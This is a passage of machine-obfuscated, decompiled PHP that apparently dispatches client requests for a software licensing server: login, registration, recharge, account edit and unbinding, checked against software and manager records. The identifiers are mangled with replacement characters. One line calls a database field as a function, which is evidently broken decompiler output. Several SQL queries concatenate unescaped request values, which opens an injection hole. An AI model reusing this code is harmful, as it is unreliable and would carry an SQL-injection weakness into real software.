$_obfuscate_ipGTiYaMjI2PjIiJjZSSkoc� = dirname( __FILE__ ).DIRECTORY_SEPARATOR.$_obfuscate_kZOJlZCOlZKRioiGiIuPkok�.DIRECTORY_SEPARATOR;
$_obfuscate_k5CLh5CJiJOPiZGLlY_UiZE� = $_obfuscate_ipGTiYaMjI2PjIiJjZSSkoc�.$_obfuscate_kZGNjJSKkpCQj4yOj5GNiIo�.".php";
$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc� = new mysql_cls( );
$_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4�( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5k� );
$_obfuscate_jZGRipSRkIeUiIeQjoaUjJI� = $_obfuscate_jIaUiIeSjZWKlIqLkIqOioc�->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_soft where `softcode`=".$_obfuscate_iImHhpCJi4eSkY_VjZOUj5Q� );
if ( empty( $_obfuscate_jZGRipSRkIeUiIeQjoaUjJI� ) )
{
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno101" );
    }
    exit( "kssdata".QQ104 );
}
_obfuscate_i4yHiJWOjZKUkY_QkouIi5M�( $_obfuscate_jZGRipSRkIeUiIeQjoaUjJI�['mac_blacklist'], long2ip( $_obfuscate_kYmJjZOIiZKJioqMkoaGiYk� ), $_obfuscate_joeUio_LioqSh5WIiI2Pk4s� );
if ( $_obfuscate_jZGRipSRkIeUiIeQjoaUjJI�['softstatus'] == 1 && $_obfuscate_kZGNjJSKkpCQj4yOj5GNiIo� != "unline" )
{
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno107" );
    }
    exit( "kssdata".QQ105 );
}
$_obfuscate_jpOTkJCPjI_TipSPjoeTjYs� = $_obfuscate_jZGRipSRkIeUiIeQjoaUjJI�['pid']."_".$_obfuscate_jZGRipSRkIeUiIeQjoaUjJI�['id'];
$_obfuscate_iJSOjpOVh4qLjI6TkY2Rj44� = $_obfuscate_jZGRipSRkIeUiIeQjoaUjJI�['pid']( "select * from kss_tb_manager where `pid`=".$_obfuscate_jZGRipSRkIeUiIeQjoaUjJI�['pid']." and `level`>7" );
if ( empty( $_obfuscate_iJSOjpOVh4qLjI6TkY2Rj44� ) )
{
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno104" );
    }
    exit( "kssdata".QQ106 );
}
if ( $_obfuscate_iJSOjpOVh4qLjI6TkY2Rj44�['endtime'] < _obfuscate_jZGJkpOSkY_HiY2HjY2JlIg�( ) && $_obfuscate_kZGNjJSKkpCQj4yOj5GNiIo� != "unline" )
{
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno105" );
    }
    exit( "kssdata".QQ107.$_obfuscate_iJSOjpOVh4qLjI6TkY2Rj44�['endtime'] );
}
if ( $_obfuscate_iJSOjpOVh4qLjI6TkY2Rj44�['islock'] == 1 && $_obfuscate_kZGNjJSKkpCQj4yOj5GNiIo� != "unline" )
{
    if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
    {
        exit( "crypteno106" );
    }
    exit( "kssdata".QQ108 );
}
_obfuscate_ho_Ki4_TiZCUk4yOkJCPh5M�( );
switch ( $_obfuscate_kZGNjJSKkpCQj4yOj5GNiIo� )
{
    case "unline" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y� = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[5], "password" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[6], "clientid" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[7], "linecode" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[8], "isrun" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[9] );
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZE� );
        exit( );
    case "basechk" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y� = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[12], "password" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[11], "clientid" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[10], "chked" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[9], "linecode" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[8], "ischangesvr" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[7], "softver" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[6], "isrun" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[5], "bdinfo" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[13], "valhost" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[14] );
        $_obfuscate_ioiLiYmJlYySlIeQkpSQkpE� = substr( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y�['valhost'], 0, 2 );
        $_obfuscate_hpCQiI_Ui42MkZSNko2Ni4Y� = $_obfuscate_ioiLiYmJlYySlIeQkpSQkpE� % 3;
        if ( $_obfuscate_hpCQiI_Ui42MkZSNko2Ni4Y� == 2 )
        {
            exit( "crypteno161" );
        }
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZE� );
        exit( );
    case "advapi" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y� = array( "czkey" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[5], "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[7], "password" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[6], "clientid" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[8], "linecode" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[9], "ischangesvr" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[10], "cmd" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[11] );
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZE� );
        exit( );
    case "reguser" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y� = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[5], "password" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[6], "password2" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[7], "bdinfo" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[8], "puser" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[9], "czkey" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[10] );
        if ( strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y�['username'] ) < 3 || 32 < strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y�['username'] ) )
        {
            exit( "kssdata".QQ109 );
        }
        if ( strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y�['password'] ) < 5 )
        {
            exit( "kssdata".QQ110 );
        }
        if ( strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y�['password2'] ) < 5 )
        {
            exit( "kssdata".QQ111 );
        }
        if ( 100 < strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y�['bdinfo'] ) )
        {
            exit( "kssdata".QQ112 );
        }
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZE� );
        exit( );
    case "czuser" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y� = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[5], "czkey" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[6] );
        if ( strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y�['username'] ) < 3 )
        {
            exit( "kssdata".QQ113 );
        }
        if ( strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y�['czkey'] ) < 32 )
        {
            exit( "kssdata".QQ114 );
        }
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZE� );
        exit( );
    case "edituser" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y� = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[5], "password" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[6], "password2" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[7], "bdinfo" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[8] );
        if ( strlen( $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y�['username'] ) < 3 )
        {
            exit( "kssdata".QQ113 );
        }
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZE� );
        exit( );
    case "unbind" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y� = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[5], "password" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[6], "clientid" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[7], "isrun" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[8] );
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZE� );
        exit( );
    case "view_uk" :
        $_obfuscate_lYqUjoqMiomGlYiQio6Qi4Y� = array( "username" => $_obfuscate_k42Uko6Qk5CLiYqIjI_Ih5U�[5] );
        include( $_obfuscate_k5CLh5CJiJOPiZGLlY_UiZE� );
        exit( );
    default :
        ob_clean( );
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJI� == 1 )
        {
            exit( "crypteno119" );
        }
        exit( "kssdata".QQ115 );
}
?>
